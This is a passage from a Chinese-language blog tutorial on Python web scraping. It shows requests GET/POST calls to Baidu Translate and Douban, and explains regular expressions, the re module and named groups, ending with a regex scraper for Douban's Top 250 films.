class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sogou.html&quot;</span>, mode=<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"> f.write(response.text)</span><br></pre></td></tr></table></figure><h4 id="requests模块⼊⻔–POST"><a href="#requests模块⼊⻔–POST" class="headerlink" title="requests模块⼊⻔–POST"></a>requests模块⼊⻔–POST</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://fanyi.baidu.com/sug&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;输入你要翻译的单词&quot;</span>)</span><br><span class="line">dat = &#123;</span><br><span class="line">    <span class="string">&quot;kw&quot;</span>:s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp =  requests.post(url,data=dat)</span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br><span class="line"></span><br><span class="line">resp.close()</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074004.jpg"                      alt="image-20220905232130423"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">kw = <span class="built_in">input</span>(<span class="string">&quot;请输⼊你要翻译的英语单词:&quot;</span>)</span><br><span class="line">dic = &#123;</span><br><span class="line"> <span class="string">&quot;kw&quot;</span>: kw <span class="comment"># 这⾥要和抓包⼯具⾥的参数⼀致.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(<span class="string">&quot;https://fanyi.baidu.com/sug&quot;</span>,data=dic)</span><br><span class="line"><span class="comment"># 返回值是json 那就可以直接解析成json</span></span><br><span class="line">resp_json = resp.json()</span><br><span class="line"><span class="comment"># &#123;&#x27;errno&#x27;: 0, &#x27;data&#x27;: [&#123;&#x27;k&#x27;: &#x27;Apple&#x27;, &#x27;v&#x27;: &#x27;n.苹果公司，原称苹果电脑公司&#x27;....</span></span><br><span class="line"><span class="built_in">print</span>(resp_json[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;v&#x27;</span>]) <span class="comment"># 拿到返回字典中的内容</span></span><br><span class="line"></span><br><span class="line">resp.close()</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074005.jpg"                      alt="image-20220905233714269"                ></p><h4 id="requests模块⼊⻔–GET进阶"><a href="#requests模块⼊⻔–GET进阶" class="headerlink" title="requests模块⼊⻔–GET进阶"></a>requests模块⼊⻔–GET进阶</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/j/chart/top_list&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新封装参数</span></span><br><span class="line">param = &#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;24&quot;</span>,</span><br><span class="line">    <span class="string">&quot;interval_id&quot;</span>: <span class="string">&quot;100:90&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url=url, params=param,headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(resp.json())</span><br><span class="line"></span><br><span class="line">resp.close()</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074007.jpg"                      alt="image-20220906001100112"                ></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/j/chart/top_list&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新封装参数</span></span><br><span class="line">param = &#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;24&quot;</span>,</span><br><span class="line">    <span class="string">&quot;interval_id&quot;</span>: <span class="string">&quot;100:90&quot;</span>,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;start&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;limit&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url=url, params=param,headers=headers)</span><br><span class="line"></span><br><span class="line">list_data = resp.json()</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;./douban.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">json.dump(list_data,fp=fp,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;over!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">resp.close()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If ``ensure_ascii`` is false, then the strings written to ``fp`` can</span><br><span class="line">contain non-ASCII characters if they appear in strings contained in</span><br><span class="line">``obj``. Otherwise, all such characters are escaped in JSON strings.</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074008.jpg"                      alt="image-20220906001855644"                ></p><ol><li>爬⾍就是写程序去模拟浏览器⽤来抓取互联⽹上的内容</li><li>python中⾃带了⼀个urllib提供给我们进⾏简易爬⾍的编写 </li><li>requests模块的简单使⽤, 包括get, post两种⽅式的请求. 以及 User-Agent的介绍</li></ol><hr><h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><h4 id="数据解析概述"><a href="#数据解析概述" class="headerlink" title="数据解析概述"></a>数据解析概述</h4><p>​    在上⼀章中, 我们基本上掌握了抓取整个⽹⻚的基本技能. 但是呢, ⼤ 多数情况下, 我们并不需要整个⽹⻚的内容, 只是需要那么⼀⼩部分. 怎么办呢? 这就涉及到了数据提取的问题. </p><p>​    提供三种解析⽅式: </p><pre><code>1. re解析 1. bs4解析 1. xpath解析</code></pre><h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>​    Regular Expression, 正则表达式, ⼀种使⽤表达式的⽅式对字符串 进⾏匹配的语法规则.只要掌握了正则编写的逻辑关系, 写出⼀个提取⻚⾯内容的正则其实并不复杂。</p><p>​    正则的语法: 使⽤元字符进⾏排列组合⽤来匹配字符串</p><p>​    在线测试正则表达式<a class="link"   href="https://tool.oschina.net/regex/" >https://tool.oschina.net/regex/<i class="fas fa-external-link-alt"></i></a> </p><p>​    元字符: 具有固定含义的特殊符号 </p><p>​    常⽤元字符:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">. 匹配除换⾏符以外的任意字符</span><br><span class="line">\w 匹配字⺟或数字或下划线</span><br><span class="line">\s 匹配任意的空⽩符</span><br><span class="line">\d 匹配数字</span><br><span class="line">\n 匹配⼀个换⾏符</span><br><span class="line">\t 匹配⼀个制表符</span><br><span class="line"></span><br><span class="line">^ 匹配字符串的开始</span><br><span class="line">$ 匹配字符串的结尾</span><br><span class="line"></span><br><span class="line">\W 匹配⾮字⺟或数字或下划线</span><br><span class="line">\D 匹配⾮数字</span><br><span class="line">\S 匹配⾮空⽩符</span><br><span class="line">a|b 匹配字符a或字符b</span><br><span class="line">() 匹配括号内的表达式，也表示⼀个组</span><br><span class="line">[...] 匹配字符组中的字符</span><br><span class="line">[^...] 匹配除了字符组中字符的所有字符</span><br></pre></td></tr></table></figure><p>​    量词: 控制前⾯的元字符出现的次数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* 重复零次或更多次</span><br><span class="line">+ 重复⼀次或更多次</span><br><span class="line">? 重复零次或⼀次</span><br><span class="line">&#123;n&#125; 重复n次</span><br><span class="line">&#123;n,&#125; 重复n次或更多次</span><br><span class="line">&#123;n,m&#125; 重复n到m次</span><br></pre></td></tr></table></figure><p>​    贪婪匹配和惰性匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.* 贪婪匹配</span><br><span class="line">.*? 惰性匹配</span><br></pre></td></tr></table></figure><p>​    这两个要着重的说⼀下. 因为我们写爬⾍⽤的最多的就是这个惰性匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">str: 玩⼉吃鸡游戏, 晚上⼀起上游戏, ⼲嘛呢? 打游戏啊</span><br><span class="line">reg: 玩⼉.*?游戏</span><br><span class="line">结果: </span><br><span class="line">玩⼉吃鸡游戏</span><br><span class="line">reg: 玩⼉.*游戏</span><br><span class="line">结果: </span><br><span class="line">玩⼉吃鸡游戏, 晚上⼀起上游戏, ⼲嘛呢? 打游戏</span><br><span class="line"></span><br><span class="line">str: &lt;div&gt;胡辣汤&lt;/div&gt;</span><br><span class="line">reg: &lt;.*&gt;</span><br><span class="line">结果: </span><br><span class="line">&lt;div&gt;胡辣汤&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">str: &lt;div&gt;胡辣汤&lt;/div&gt;</span><br><span class="line">reg: &lt;.*?&gt;</span><br><span class="line">结果:</span><br><span class="line">&lt;div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">str: &lt;div&gt;胡辣汤&lt;/div&gt;&lt;span&gt;饭团&lt;/span&gt;</span><br><span class="line">reg: &lt;div&gt;.*?&lt;/div&gt;</span><br><span class="line">结果:</span><br><span class="line">&lt;div&gt;胡辣汤&lt;/div&gt;</span><br><span class="line"> </span><br><span class="line">str:abduaiaiuhfwhfioahwfxafjawofijawoifjx</span><br><span class="line">reg:.*?x</span><br><span class="line">结果:</span><br><span class="line">abduaiaiuhfwhfioahwfx</span><br><span class="line">afjawofijawoifjx</span><br></pre></td></tr></table></figure><p>​    能发现这样⼀个规律: .*? 表示尽可能少的匹配, .*表示尽可能多的匹配</p><h4 id="re模块"><a href="#re模块" class="headerlink" title="re模块"></a>re模块</h4><p>​    怎么在python程序中使⽤正则呢? 答案是re模块。re模块中我们只需要记住这么⼏个功能就⾜够我们使⽤了.</p><p>​    1、findall：匹配所有符合正则的内容。返回list</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lst = re.findall(<span class="string">&quot;m&quot;</span>, <span class="string">&quot;mai le fo len, mai nimei!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(lst) <span class="comment"># [&#x27;m&#x27;, &#x27;m&#x27;, &#x27;m&#x27;]</span></span><br><span class="line">lst = re.findall(<span class="string">r&quot;\d+&quot;</span>, <span class="string">&quot;5点之前. 你要给我5000万&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(lst) <span class="comment"># [&#x27;5&#x27;, &#x27;5000&#x27;]</span></span><br><span class="line">lst = re.findall(<span class="string">r&quot;\d+&quot;</span>, <span class="string">&quot;我的电话是10086，我女朋友电话10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(lst) <span class="comment"># [&#x27;10086&#x27;, &#x27;10010&#x27;]</span></span><br></pre></td></tr></table></figure><p>​    2、finditer：匹配字符串中所有的内容[返回迭代器]，迭代器拿到数据需要.group</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">it = re.finditer(<span class="string">r&quot;\d+&quot;</span>, <span class="string">&quot;我的电话10086，我女朋友的电话10010&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> it:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(i.group())</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074009.jpg"                      alt="image-20220907135829895"                ></p><p>​    3、search，找到一个结果就返回，返回的结果是match对象，拿数据需要.group()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = re.search(<span class="string">r&quot;\d+&quot;</span>, <span class="string">&quot;我的电话10086，我女朋友的电话10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s.group()) <span class="comment"># 10086</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    4、match，从头开始匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s1 = re.match(<span class="string">r&quot;\d+&quot;</span>, <span class="string">&quot;10086，我女朋友的电话10010&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s1.group()) <span class="comment"># 10086</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>​    5、compile，预加载正则表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+&quot;</span>)</span><br><span class="line">ret = obj.finditer(<span class="string">&quot;我的电话10086，我女朋友的电话10010&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">    <span class="built_in">print</span>(i.group())</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074010.jpg"                      alt="image-20220907141941806"                ></p><p>​    6、正则中的内容如何单独提取? 单独获取到正则中的具体内容可以给分组起名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;jay&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;周杰伦&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;jj&#x27;&gt;&lt;span id=&#x27;2&#x27;&gt;林俊杰&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;jolin&#x27;&gt;&lt;span id=&#x27;3&#x27;&gt;蔡依林&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;sylar&#x27;&gt;&lt;span id=&#x27;4&#x27;&gt;玛卡巴卡&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;tory&#x27;&gt;&lt;span id=&#x27;5&#x27;&gt;唔西迪西&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># re.S：让 . 可以匹配换行符</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;div class=&#x27;.*?&#x27;&gt;&lt;span id=&#x27;\d+&#x27;&gt;.*?&lt;/span&gt;&lt;/div&gt;&quot;</span>, re.S)</span><br><span class="line">result = obj.finditer(s)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(it.group())</span><br></pre></td></tr></table></figure><p>​    按照之前的办法，我们看到的只是这样</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074012.jpg"                      alt="image-20220907144846945"                ></p><p>​    我们在组里加上(?P&lt;wahaha&gt;)这类相当于给组起名字，然后通过组拿到起名的内容，便可得到我们想要的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;jay&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;周杰伦&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;jj&#x27;&gt;&lt;span id=&#x27;2&#x27;&gt;林俊杰&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;jolin&#x27;&gt;&lt;span id=&#x27;3&#x27;&gt;蔡依林&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;sylar&#x27;&gt;&lt;span id=&#x27;4&#x27;&gt;玛卡巴卡&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;tory&#x27;&gt;&lt;span id=&#x27;5&#x27;&gt;唔西迪西&lt;/span&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># re.S：让 . 可以匹配换行符</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;div class=&#x27;.*?&#x27;&gt;&lt;span id=&#x27;\d+&#x27;&gt;(?P&lt;wahaha&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;</span>, re.S)</span><br><span class="line">result = obj.finditer(s)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;wahaha&quot;</span>))</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074013.jpg"                      alt="image-20220907150609578"                ></p><h4 id="豆瓣top250电影排行榜"><a href="#豆瓣top250电影排行榜" class="headerlink" title="豆瓣top250电影排行榜"></a>豆瓣top250电影排行榜</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074015.jpg"                      alt="image-20220907152411905"                ></p><p>​    ⽬标: 抓取”电影名称”,”上映年份”,”评分”,”评分⼈数”四项内容.</p><p>​    ⾸先, 先看⼀下⻚⾯源代码. 数据是否是直接怼在源代码上的</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074018.jpg"                      alt="image-20220907152717524"                ></p><p>​    很明显, 我们想要的数据全部都在⻚⾯源代码中体现了. 所以, 我们不 需要考虑js动态加载数据的情况了. 那么接下来就是编写爬⾍代码的 第⼀步了. 拿到⻚⾯源代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line"> <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_4) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.88 Safari/537.36&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250?start=0&amp;filter=&quot;</span></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p>​    从⻚⾯源代码中提取我们需要的内容. 这时候我们就可以去写正则了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿到页面源代码 requests</span></span><br><span class="line"><span class="comment"># 通过re来提取想要的信息 re</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                  <span class="string">&quot;Chrome/104.0.0.0 Safari/537.36 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line">page_content = resp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;li&gt;.*?&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;&#x27;</span>, re.S)</span><br><span class="line">result = obj.finditer(page_content)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&quot;name&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074021.jpg"                      alt="image-20220907153939408"                ></p><p>​    可以看到已经获取了名字，下面我们继续写其他的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拿到页面源代码 requests</span></span><br><span class="line"><span class="comment"># 通过re来提取想要的信息 re</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://movie.douban.com/top250&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                  <span class="string">&quot;Chrome/104.0.0.0 Safari/537.36 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.get(url, headers=headers)</span><br><span class="line">page_content = resp.text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析数据</span></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;li&gt;.*?&lt;div class=&quot;item&quot;&gt;.*?&lt;span class=&quot;title&quot;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;.*?&#x27;</span></span><br><span class="line">                 <span class="string">r&#x27;&lt;p class=&quot;&quot;&gt;.*?&lt;br&gt;(?P&lt;year&gt;.*?)&amp;nbsp.*?&#x27;</span></span><br><span class="line">                 <span class="string">r&#x27;&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(?P&lt;score&gt;.*?)&lt;/span&gt;.*?&#x27;</span></span><br><span class="line">                 <span class="string">r&#x27;&lt;span&gt;(?P&lt;num&gt;.*?)人评价&lt;/span&gt;&#x27;</span>, re.S)</span><br><span class="line">result = obj.finditer(page_content)</span><br><span class="line"><span 